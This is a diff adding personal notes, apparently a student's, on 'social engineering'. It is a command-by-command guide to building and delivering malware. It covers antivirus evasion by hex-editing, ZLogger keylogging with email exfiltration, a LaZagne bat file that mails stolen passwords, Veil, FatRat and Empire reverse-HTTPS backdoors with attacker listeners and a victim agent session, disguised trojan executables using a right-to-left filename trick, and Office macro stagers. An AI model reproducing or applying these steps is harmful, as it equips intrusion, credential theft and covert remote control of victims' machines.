@@ -1,0 +1,732 @@
+
+About Social Engineering
+------------------------
+------------------------
+
+"It can bypass anti-virus programs by modifying hex values"
+
+"Use HxD software"
+
+https://mh-nexus.de/en/hxd/
+
+- Install HxD.
+- Edit .exe virus file in HxD.
+- Modify texts(Program comments) in that file.
+- Test it work well or not. If not it revert back.
+
+Tools
+-----
+- ZLogger (Key Logger)
+- LaZagne (Password Discoverer)
+- Metasploit Framework
+- Powershell Empire (Back Door)
+- Veil (Back Door)
+- Fat Rat (Back Door)
+
+ZLogger
+-------
+> git clone zlogger_git
+> cd zlogger_dir
+> ls
+> python zlogger.py --help
+> python zlogger.py -i 60 -w -e your_email@gmail.com -p your_password -o file_name
+
+LaZagne
+-------
+- Download lazagne.exe and run_lazange_exe.bat from git
+- Read run_lazange_exe.bat to understand
+- Send that bat file to target
+- When target run that bat file it will download and execute lazagne.exe and send mail to hacker about passwords 
+
+Veil
+----
+> veil
+> list
+
+===============================================================================
+                             Veil | [Version]: 3.1.14
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+ [*] Available Tools:
+                                                                                                                          
+        1)      Evasion
+        2)      Ordnance
+
+> use 1
+>> list
+
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+
+ [*] Available Payloads:                                                                                                  
+                                                                                                                          
+        1)      autoit/shellcode_inject/flat.py
+
+        2)      auxiliary/coldwar_wrapper.py
+        3)      auxiliary/macro_converter.py
+        4)      auxiliary/pyinstaller_wrapper.py
+
+        5)      c/meterpreter/rev_http.py
+        6)      c/meterpreter/rev_http_service.py
+        7)      c/meterpreter/rev_tcp.py
+        8)      c/meterpreter/rev_tcp_service.py
+
+        9)      cs/meterpreter/rev_http.py
+        10)     cs/meterpreter/rev_https.py
+        11)     cs/meterpreter/rev_tcp.py
+        12)     cs/shellcode_inject/base64.py
+        13)     cs/shellcode_inject/virtual.py
+
+        14)     go/meterpreter/rev_http.py
+        15)     go/meterpreter/rev_https.py
+        16)     go/meterpreter/rev_tcp.py
+        17)     go/shellcode_inject/virtual.py
+
+        18)     lua/shellcode_inject/flat.py
+
+        19)     perl/shellcode_inject/flat.py
+
+        20)     powershell/meterpreter/rev_http.py
+        21)     powershell/meterpreter/rev_https.py
+        22)     powershell/meterpreter/rev_tcp.py
+        23)     powershell/shellcode_inject/psexec_virtual.py
+        24)     powershell/shellcode_inject/virtual.py
+
+        25)     python/meterpreter/bind_tcp.py
+        26)     python/meterpreter/rev_http.py
+        27)     python/meterpreter/rev_https.py
+        28)     python/meterpreter/rev_tcp.py
+        29)     python/shellcode_inject/aes_encrypt.py
+        30)     python/shellcode_inject/arc_encrypt.py
+        31)     python/shellcode_inject/base64_substitution.py
+        32)     python/shellcode_inject/des_encrypt.py
+        33)     python/shellcode_inject/flat.py
+        34)     python/shellcode_inject/letter_substitution.py
+        35)     python/shellcode_inject/pidinject.py
+        36)     python/shellcode_inject/stallion.py
+
+        37)     ruby/meterpreter/rev_http.py
+        38)     ruby/meterpreter/rev_https.py
+        39)     ruby/meterpreter/rev_tcp.py
+        40)     ruby/shellcode_inject/base64.py
+        41)     ruby/shellcode_inject/flat.py 
+
+>> use 15       
+
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+ Payload Information:
+                                                                                                                          
+        Name:           Pure Golang Reverse HTTPS Stager
+        Language:       go
+        Rating:         Normal
+        Description:    pure windows/meterpreter/reverse_https stager, no
+                        shellcode
+
+Payload: go/meterpreter/rev_https selected
+
+ Required Options:
+                                                                                                                          
+Name                    Value           Description
+----                    -----           -----------
+BADMACS                 FALSE           Check for VM based MAC addresses
+CLICKTRACK              X               Require X number of clicks before execution
+COMPILE_TO_EXE          Y               Compile to an executable
+CURSORCHECK             FALSE           Check for mouse movements
+DISKSIZE                X               Check for a minimum number of gigs for hard disk
+HOSTNAME                X               Optional: Required system hostname
+INJECT_METHOD           Virtual         Virtual or Heap
+LHOST                   your_ip_addr    IP of the Metasploit handler
+LPORT                   8080            Port of the Metasploit handler
+MINPROCS                X               Minimum number of running processes
+PROCCHECK               FALSE           Check for active VM processes
+PROCESSORS              1               Optional: Minimum number of processors
+RAMCHECK                FALSE           Check for at least 3 gigs of RAM
+SLEEP                   6               Optional: Sleep "Y" seconds, check if accelerated
+USERNAME                X               Optional: The required user account
+USERPROMPT              FALSE           Prompt user prior to injection
+UTCCHECK                FALSE           Check if system uses UTC time
+
+ Available Commands:
+                                                                                                                          
+        back            Go back to Veil-Evasion
+        exit            Completely exit Veil
+        generate        Generate the payload
+        options         Show the shellcode's options
+        set             Set shellcode option
+
+>>> set LHOST your_ip_addr
+>>> set LPORT 8080
+>>> generate
+
+"Oops! Before generate, set"
+
+: reverse_https_8080
+
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+ [*] Language: go
+ [*] Payload Module: go/meterpreter/rev_https
+ [*] Executable written to: /var/lib/veil/output/compiled/rev_https_8080.exe
+ [*] Source code written to: /var/lib/veil/output/source/rev_https_8080.go
+ [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/rev_https_8080.rc
+
+Hit enter to continue...
+
+Metasploit Framework
+--------------------
+> msfconsole
+> use exploit/multi/handler
+>> show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.97.4     yes       The listen address (an interface may be specified)
+   LPORT  8080             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+>> set PAYLOAD windows/meterpreter/reverse_https
+>> exploit
+
+"Start apache server"
+
+> service apache2 start
+
+Fat Rat
+--------
+"OKay Lets start Fat Rat"
+
+         ____
+        |    | 
+        |____| 
+       _|____|_       _____ _       _____     _   _____     _       
+        /  ee\_      |_   _| |_ ___|   __|___| |_| __  |___| |_     
+      .<     __O       | | |   | -_|   __| .'|  _|    -| .'|  _|
+     /\ \.-.' \        |_| |_|_|___|__|  |___|_| |__|__|___|_|  
+    J  \.|'.\/ \                  
+    | |_.|. | | |   [--]   Backdoor Creator for Remote Acces [--] 
+     \__.' .|-' /   [--]  Created by: Edo Maland (Screetsec) [--]
+     L   /|o'--'\   [--]            Version: 1.9.7           [--]
+     |  /\/\/\   \  [--]          Codename: Whistle          [--]    
+     J /      \.__\ [--]   Follow me on Github: @Screetsec   [--]
+     J /      \.__\ [--]   Dracos Linux : @dracos-linux.org  [--]
+     |/         /   [--]                                     [--]
+       \      .'\.  [--]     SELECT AN OPTION TO BEGIN:      [--]  
+    ____)_/\_(___\. [--] .___________________________________[--]
+   (___._/  \_.___)'\_.-----------------------------------------/
+
+  
+        [01]  Create Backdoor with msfvenom
+        [02]  Create Fud 100% Backdoor with Fudwin 1.0
+        [03]  Create Fud Backdoor with Avoid v1.2  
+        [04]  Create Fud Backdoor with backdoor-factory [embed] 
+        [05]  Backdooring Original apk [Instagram, Line,etc] 
+        [06]  Create Fud Backdoor 1000% with PwnWinds [Excelent] 
+        [07]  Create Backdoor For Office with Microsploit 
+        [08]  Trojan Debian Package For Remote Acces [Trodebi] 
+        [09]  Load/Create auto listeners                                                                                  
+        [10]  Jump to msfconsole                                                                                          
+        [11]  Searchsploit                                                                                                
+        [12]  File Pumper [Increase Your Files Size]                                                                      
+        [13]  Configure Default Lhost & Lport                                                                             
+        [14]  Cleanup                                                                                                     
+        [15]  Help                                                                                                        
+        [16]  Credits                                                                                                     
+        [17]  Exit
+
+> 6
+
+
+                                  ______    
+                               .-        -. 
+                              /            \         
+                             |,  .-.  .-.  ,|      
+                             | )(_ /  \_ )( |
+                             |/     /\     \|    
+                   (@_       <__    ^^    __>        
+              _     ) \_______\__|IIIIII|__/____________________ 
+             (_)\@8@8{}<________________________________________> 
+                    )_/         \ IIIIII /                    
+                   (@            --------                      
+                            PwnWind Version  v1.5 
+                        Pwned Windows with backdoor
+                      Author : Edo Maland (Screetsec)
+             Powershell Injection attacks on any Windows Platform                  
+
+        [1]  Create a bat file+Powershell (FUD 100%)
+        [2]  Create exe file with C# + Powershell (FUD 100%) 
+        [3]  Create exe file with apache + Powershell (FUD 100%)
+        [4]  Create exe file with C + Powershell (FUD 98 %)
+        [5]  Create Backdoor with C + Powershell + Embed Pdf (FUD 80%)                                                    
+        [6]  Create Backdoor with C / Meteperter_reverse_tcp (FUD 97%)                                                    
+        [7]  Create Backdoor with C / Metasploit Staging Protocol (FUD 98%)                                               
+        [8]  Create Backdoor with C to dll ( custom dll inject )                                                          
+        [9]  Back to Menu 
+
+> 1
+
+                                                                                                                         
+   +-------------------------------------------+                                                                          
+   | [ 1 ] windows/shell_bind_tcp              |                                                                          
+   | [ 2 ] windows/shell/reverse_tcp           |                                                                          
+   | [ 3 ] windows/meterpreter/reverse_tcp     |                                                                          
+   | [ 4 ] windows/meterpreter/reverse_tcp_dns |                                                                          
+   | [ 5 ] windows/meterpreter/reverse_http    |                                                                          
+   | [ 6 ] windows/meterpreter/reverse_https   |                                                                          
+   +-------------------------------------------+  
+
+> 6
+
+Backdoor Saved To : /root/Fatrat_Generated/rev_https_8081.bat        
+
+Powershell Empire
+-----------------
+> sudo su
+> powershell-empire
+
+================================================================================
+ [Empire]  Post-Exploitation Framework
+================================================================================
+ [Version] 3.8.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
+================================================================================
+ [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
+================================================================================
+ This build was released exclusively for Kali Linux | https://kali.org
+================================================================================
+
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
+
+
+       319 modules currently loaded
+
+       0 listeners currently active
+
+       0 agents currently active
+
+> listeners
+>> uselistener
+
+dbx             http_com        http_hop        http_mapi       onedrive        
+http            http_foreign    http_malleable  meterpreter     redirector
+
+>> uselistener http
+>>> info
+
+    Name: HTTP[S]
+Category: client_server
+
+Authors:
+  @harmj0y
+
+Description:
+  Starts a http[s] listener (PowerShell or Python) that uses a
+  GET/POST approach.
+
+HTTP[S] Options:
+
+  Name              Required    Value                            Description
+  ----              --------    -------                          -----------
+  Name              True        http                             Name for the listener.
+  Host              True        http://192.168.97.4:8080         Hostname/IP for staging.
+  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
+  Port              True        8080                             Port for the listener.
+  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
+  StagingKey        True        7dnZ>fYum&vRSU*xH/]i!zQNj20lKGLq Staging key for initial agent negotiation.
+  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
+  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
+  DefaultLostLimit  True        60                               Number of missed checkins before exiting
+  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
+                                process.php|Mozilla/5.0 (Windows
+                                NT 6.1; WOW64; Trident/7.0;
+                                rv:11.0) like Gecko
+  CertPath          False                                        Certificate path for https listeners.
+  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
+  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
+  Headers           True        Server:Microsoft-IIS/7.5         Headers for the control server.
+  Cookie            False       EBmIZCnNhsDWwRQ                  Custom Cookie Name
+  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
+  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
+  Proxy             False       default                          Proxy to use for request (default, none, or other).
+  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
+  SlackURL          False                                        Your Slack Incoming Webhook URL to communicate with your Slack instance.
+
+>>> set Port 8080
+>>> help
+
+Listener Commands
+=================
+agents            Jump to the agents menu.
+back              Go back a menu.
+creds             Display/return credentials from the database.
+execute           Execute the given listener module.
+exit              Exit Empire.
+help              Displays the help menu.
+info              Display listener module options.
+launcher          Generate an initial launcher for this listener.
+listeners         Jump to the listeners menu.
+main              Go back to the main menu.
+resource          Read and execute a list of Empire commands from a file.
+set               Set a listener option.
+unset             Unset a listener option.
+
+>>> execute
+
+[*] Starting listener 'http'
+ * Serving Flask app "http" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+[+] Listener successfully started!
+
+
+>>> back
+>> list
+
+[*] Active listeners:
+                                                                                                                          
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  http              http            http://192.168.97.4:8080             5/0.0
+
+>> exit
+> sudo powershell-empire
+
+================================================================================
+ [Empire]  Post-Exploitation Framework
+================================================================================
+ [Version] 3.8.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
+================================================================================
+ [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
+================================================================================
+ This build was released exclusively for Kali Linux | https://kali.org
+================================================================================
+
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
+
+
+       319 modules currently loaded
+
+       1 listeners currently active
+
+       0 agents currently active
+
+> listeners
+
+[*] Active listeners:
+
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  http              http            http://192.168.97.4:8080             5/0.0
+
+>> exit
+> sudo powershell-empire
+
+================================================================================
+ [Empire]  Post-Exploitation Framework
+================================================================================
+ [Version] 3.8.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
+================================================================================
+ [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
+================================================================================
+ This build was released exclusively for Kali Linux | https://kali.org
+================================================================================
+
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
+
+
+       319 modules currently loaded
+
+       1 listeners currently active
+
+       0 agents currently active
+
+> usestager
+
+multi/bash                osx/jar                   windows/bunny             windows/launcher_xml
+multi/launcher            osx/launcher              windows/csharp_exe        windows/macro
+multi/macro               osx/macho                 windows/dll               windows/macroless_msword
+multi/pyinstaller         osx/macro                 windows/ducky             windows/shellcode
+multi/war                 osx/pkg                   windows/hta               windows/teensy
+osx/applescript           osx/safari_launcher       windows/launcher_bat      windows/wmic
+osx/application           osx/shellcode             windows/launcher_lnk      
+osx/ducky                 osx/teensy                windows/launcher_sct      
+osx/dylib                 windows/backdoorLnkMacro  windows/launcher_vbs
+
+> usestager windows/launcher_bat
+>> info
+
+Name: BAT Launcher
+
+Description:
+  Generates a self-deleting .bat launcher for
+  Empire.
+
+Options:
+
+  Name             Required    Value             Description
+  ----             --------    -------           -----------
+  Listener         True                          Listener to generate stager for.
+  Language         True        powershell        Language of the stager to generate.
+  StagerRetries    False       0                 Times for the stager to retry
+                                                 connecting.
+  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,
+                                                 otherwise displayed on the screen.
+  Delete           False       True              Switch. Delete .bat after running.
+  Obfuscate        False       False             Switch. Obfuscate the launcher
+                                                 powershell code, uses the
+                                                 ObfuscateCommand for obfuscation types.
+                                                 For powershell only.
+  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
+                                                 Only used if Obfuscate switch is True.
+                                                 For powershell only.
+  UserAgent        False       default           User-agent string to use for the staging
+                                                 request (default, none, or other).
+  Proxy            False       default           Proxy to use for request (default, none,
+                                                 or other).
+  ProxyCreds       False       default           Proxy credentials
+                                                 ([domain\]username:password) to use for
+                                                 request (default, none, or other).
+  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in
+                                                 the stager code.
+  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in
+                                                 the stager code.
+>> set Listener http
+>> set OutFile /var/www/html/evil-files/powershell_empire_http_8080.bat
+>> execute
+
+[*] Stager output written out to: /var/www/html/evil-files/powershell_empire_http_8080.bat
+
+"Run above bat file in target computer"
+
+"The following will show in hacker's powershell-empire terminal"
+
+[*] Sending POWERSHELL stager (stage 1) to 192.168.97.3                                                                   
+[*] New agent RNBKXS3E checked in
+[+] Initial agent RNBKXS3E from 192.168.97.3 now active (Slack)
+[*] Sending agent (stage 2) to RNBKXS3E at 192.168.97.3
+
+>> agents
+
+[*] Active agents:
+                                                                                                                                                           
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+ RNBKXS3E ps 192.168.97.3    ZAWMOEHTIKE-PC    zawmoehtike-pc\zawmoeht powershell         2324   5/0.0    2021-06-06 06:28:06  http   
+
+>> interact RNBKXS3E
+>>> help
+
+Agent Commands
+==============
+agents            Jump to the agents menu.
+back              Go back a menu.
+bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn <listener>
+clear             Clear out agent tasking.
+creds             Display/return credentials from the database.
+dirlist           Tasks an agent to store the contents of a directory in the database.
+download          Task an agent to download a file into the C2.
+exit              Task agent to exit.
+help              Displays the help menu or syntax for particular commands.
+info              Display information about this agent
+injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid>
+jobs              Return jobs or kill a running job.
+kill              Task an agent to kill a particular process name or ID.
+killdate          Get or set an agent's killdate (01/01/2016).
+list              Lists all active agents (or listeners).
+listeners         Jump to the listeners menu.
+lostlimit         Task an agent to change the limit on lost agent detection
+main              Go back to the main menu.
+mimikatz          Runs Invoke-Mimikatz on the client.
+psinject          Inject a launcher into a remote process. Ex. psinject <listener> <pid/process_name>
+pth               Executes PTH for a CredID through Mimikatz.
+reflectiveload    Task an agent to use a shell command.
+rename            Rename the agent.
+resource          Read and execute a list of Empire commands from a file.
+revtoself         Uses credentials/tokens to revert token privileges.
+sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]
+scriptcmd         Execute a function in the currently imported PowerShell script.
+scriptimport      Imports a PowerShell script and keeps it in memory in the agent.
+searchmodule      Search Empire module names/descriptions.
+shell             Task an agent to use a shell command.
+shinject          Inject non-meterpreter listener shellcode into a remote process. Ex. shinject <listener> <pid>
+sleep             Task an agent to 'sleep interval [jitter]'
+spawn             Spawns a new Empire agent for the given listener name. Ex. spawn <listener>
+steal_token       Uses credentials/tokens to impersonate a token for a given process ID.
+sysinfo           Task an agent to get system information.
+updatecomms       Dynamically update the agent comms to another listener
+updateprofile     Update an agent connection profile.
+upload            Task the C2 to upload a file into an agent.
+usemodule         Use an Empire PowerShell module.
+workinghours      Get or set an agent's working hours (9:00-17:00).
+
+>>> sysinfo
+
+Listener:         http://192.168.97.4:8080
+Internal IP:      192.168.97.3
+Username:         zawmoehtike-pc\zawmoehtike
+Hostname:         ZAWMOEHTIKE-PC
+OS:               Microsoft Windows 7 Ultimate 
+High Integrity:   0
+Process Name:     powershell
+Process ID:       2324
+Language:         powershell
+Language Version: 2
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+Trojan
+------
+
+"Trojan support to Key Logger, Back Door and Password Discovery Tool"
+
+"Trojan file look normal file but it execute evil code in background (program file that support back door, key logger, password discovery)"
+
+> Use BatToExe Converter to convert bat file to exe file to able to run silently in background
+> Change that exe file icon (like pdf) by using BatToExe program (warning: image file must be ico)
+> Hide exe file extension by using Characters Program in Kali Linux (eg: my‮gpj.exe)
+
+Tools
+- BatToExe Converter
+- Autoit
+
+Embedding Trojan in Legitimate Microsoft Office Files
+----------------------------------------------------
+- Open Powershell Empire in terminal
+- Open Listener in Powershell Empire
+- Open Stager in Powershell Empire
+- Copy source code from stager file to macro in Microsoft Office file
+
+> usestager
+multi/bash                osx/jar                   windows/bunny             windows/launcher_xml
+multi/launcher            osx/launcher              windows/csharp_exe        windows/macro
+multi/macro               osx/macho                 windows/dll               windows/macroless_msword
+multi/pyinstaller         osx/macro                 windows/ducky             windows/shellcode
+multi/war                 osx/pkg                   windows/hta               windows/teensy
+osx/applescript           osx/safari_launcher       windows/launcher_bat      windows/wmic
+osx/application           osx/shellcode             windows/launcher_lnk      
+osx/ducky                 osx/teensy                windows/launcher_sct      
+osx/dylib                 windows/backdoorLnkMacro  windows/launcher_vbs
+
+> usestager windows/macro
+> info
+Name: Macro
+
+Description:
+  Generates an office macro for Empire, compatible
+  with office 97-2003, and 2007 file types.
+
+Options:
+
+  Name             Required    Value             Description
+  ----             --------    -------           -----------
+  Listener         True                          Listener to generate stager for.
+  Language         True        powershell        Language of the stager to generate.
+  StagerRetries    False       0                 Times for the stager to retry
+                                                 connecting.
+  OutFile          False                         File to output launcher to, otherwise
+                                                 displayed on the screen.
+  Base64           True        True              Switch. Base64 encode the output.
+  Obfuscate        False       False             Switch. Obfuscate the launcher
+                                                 powershell code, uses the
+                                                 ObfuscateCommand for obfuscation types.
+                                                 For powershell only.
+  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
+                                                 Only used if Obfuscate switch is True.
+                                                 For powershell only.
+  SafeChecks       True        True              Switch. Checks for LittleSnitch or a
+                                                 SandBox, exit the staging process if
+                                                 true. Defaults to True.
+  UserAgent        False       default           User-agent string to use for the staging
+                                                 request (default, none, or other).
+  Proxy            False       default           Proxy to use for request (default, none,
+                                                 or other).
+  ProxyCreds       False       default           Proxy credentials
+                                                 ([domain\]username:password) to use for
+                                                 request (default, none, or other).
+  ScriptLogBypass  False       True              Include cobbr's Script Block Log Bypass
+                                                 in the stager code.
+  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in
+                                                 the stager code.
+  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in
+                                                 the stager code.
+  OutlookEvasion   False       False             Include BC-Securty's Outlook Sandbox
+                                                 evasion code
+
+> set Listener http
+
+"Above command joint between listener and stager"
+
+> set OutFile /var/www/html/evil-files/trojan_embedded_8080
+> execute
+
+[*] Stager output written out to: /var/www/html/evil-files/trojan_embedded_8080
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
